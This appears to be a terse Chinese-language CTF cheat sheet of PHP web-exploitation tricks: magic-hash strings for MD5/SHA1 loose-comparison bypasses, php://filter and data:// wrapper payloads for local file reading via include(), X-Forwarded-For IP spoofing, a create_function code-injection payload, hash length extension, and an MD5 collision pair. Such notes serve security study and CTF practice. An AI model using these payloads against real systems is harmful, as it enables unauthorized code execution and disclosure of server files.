- 构造数组绕过sha1，md5等
- 类型转换 0e开头
- 0e开头的md5`QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a sha1(str) sha1('aaroZmOk')  sha1('aaK1STfY') sha1('aaO8zKZF') sha1('aa3OFF9m')`
- 弱比较，变量覆盖
- 构造文件
    - php://input 数据放message body（比较方便）
    - data://text/plain;base64,<加密后的数据>
- include() 暴露本地文件 `php://filter/read=convert.base64-encode/resource=<filename>`
- php `intval()`将取INT32(64)_MAX或INT32(64)_MIN来避免溢出，32位系统上 intval(1111111111111) = 2147483647
- `is_numeric`的结果受空字符影响，`is_numeric('33 ') == false`
- php `chr()`收到不在0-255的参数将对其处理到0-255后返回ascii码
```php
while ($ascii < 0) {
    $ascii += 256;
}
$ascii %= 256;
```
- 哈希扩展攻击，可以使用hashpumpy这个库(python2)，有单独executable
- 伪造IP: X-Forwarded-For
- 字符串连接，base64绕过关键词过滤
- strcmp比较数组、函数、对象会返回NULL，可用于绕过。
- `(int)('9223372036854775808' + 0) == -9223372036854775808`
- create_function代码执行
```
$funstring = 'return -1 * var_dump($a[""]);}phpinfo();/*"]';
$unused = create_function('',$funstring);
```

- md5碰撞
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
- system_id = md5(php_version + zend_extension_id + zend_bin_id).hexdigest()
